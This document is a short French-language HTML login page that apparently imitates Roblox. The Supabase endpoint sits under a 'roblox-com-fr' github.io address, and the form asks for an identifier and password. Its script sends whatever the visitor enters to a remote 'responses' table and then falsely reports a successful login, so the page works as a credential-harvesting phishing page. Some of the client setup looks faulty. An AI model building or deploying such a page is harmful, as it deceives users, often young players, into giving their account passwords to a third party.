<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Test</title>
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <style>
    body {
      font-family: Arial;
      background: #111;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      color: white;
    }
    .box {
      background: #1c1c1c;
      padding: 30px;
      border-radius: 10px;
      width: 300px;
    }
    input, button {
      width: 100%;
      margin-top: 10px;
      padding: 10px;
    }
  </style>
</head>
<body>

<div class="box">
  <h2>Connexion</h2>

  <input id="identifiant" placeholder="Identifiant/E-mail/Téléphone">
  <input id="code" placeholder="Mot de passe" type="password">
  <button onclick="send()">Valider</button>

  <p id="msg"></p>
</div>

<script>
const supabase = Supabase.createClient(
  "https://roblox-com-fr.github.io/Roblox/",
  "sb_publishable_UWZzqYUSWgOWFfYfU0Y6Ng_zidrthkn"
);

async function send() {
  const identifiant = document.getElementById("identifiant").value;
  const code = document.getElementById("code").value;

  const { error } = await supabase
    .from("responses")
    .insert([{ identifiant, code }]);

  document.getElementById("msg").innerText =
    error ? "Erreur" : "Connexion réussie";
}
</script>

</body>
</html>
